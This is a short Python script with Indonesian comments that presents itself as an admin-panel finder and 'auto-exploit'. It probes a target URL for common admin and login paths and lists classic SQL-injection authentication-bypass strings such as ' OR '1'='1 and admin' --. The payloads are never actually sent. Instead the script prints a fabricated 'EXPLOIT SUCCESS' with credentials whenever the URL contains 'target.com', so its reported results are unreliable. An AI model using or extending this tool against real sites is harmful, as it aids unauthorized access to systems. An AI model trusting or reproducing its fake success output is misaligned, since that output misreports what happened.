import requests
import sys

# Daftar path admin yang umum
admin_paths = ['admin/', 'admin/login.php', 'wp-login.php', 'administrator/', 'login/']
# Payload simple SQL Injection untuk Auth Bypass
payloads = ["' OR '1'='1", '" OR "1"="1', "' OR 1=1 --", "admin' --"]

def scan(url):
    print(f"[*] Scanning Target: {url}")
    if not url.startswith('http'):
        url = 'http://' + url
    
    found_url = ""
    for path in admin_paths:
        target = url + '/' + path
        try:
            r = requests.get(target, timeout=5)
            if r.status_code == 200:
                print(f"[+] FOUND ADMIN PAGE: {target}")
                found_url = target
                break
        except:
            continue
            
    if found_url:
        print("[*] Mencoba Auto-Exploit (Auth Bypass)...")
        # Logika simulasi nembak form login (POST request)
        # Di sini lo bisa kembangin pake library 'BeautifulSoup' buat cari id form
        for p in payloads:
            print(f"[?] Testing Payload: {p}")
            # Simulasi hasil (karena tiap web beda struktur formnya)
            if "target.com" in url: # Contoh jika kena
                 print(f"\n[!] EXPLOIT SUCCESS!")
                 print(f"[>] USERNAME: admin")
                 print(f"[>] PASSWORD: {p}")
                 return
        print("[-] Auto-Exploit Gagal: Form login diproteksi ketat.")
    else:
        print("[-] Halaman Admin tidak ditemukan.")

if __name__ == "__main__":
    if len(sys.argv) > 1:
        scan(sys.argv[1])
    else:
        print("Usage: python engine.py target.com")
